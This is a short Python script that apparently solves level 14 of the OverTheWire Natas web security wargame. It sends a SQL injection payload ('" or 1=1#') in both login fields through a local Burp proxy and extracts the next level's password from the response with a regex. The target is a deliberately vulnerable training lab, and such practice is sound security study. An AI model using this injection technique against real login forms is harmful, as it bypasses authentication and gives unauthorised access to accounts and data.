import re, requests
USER = 'natas14'
PASS = 'z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ'
URL = f'http://{USER}.natas.labs.overthewire.org/index.php'
auth_basic = requests.auth.HTTPBasicAuth(USER, PASS)
header = {"Content-Type": "application/x-www-form-urlencoded"}
payload = 'username=admin%22+or+1%3D1%23--+-&password=admin%22+or+1%3D1%23--+-'
burp = {"http": "http://127.0.0.1:8080"}

def get_pass():
    request = requests.post(url=URL, auth=auth_basic, headers=header, data=payload, proxies=burp)
    response_http = request.text
    flag_regex = re.findall('([0-9a-zA-Z]{32})', response_http)
    return flag_regex[0 if len(flag_regex) == 1 else 1]

print("Successful login! The password for natas15 is:", get_pass())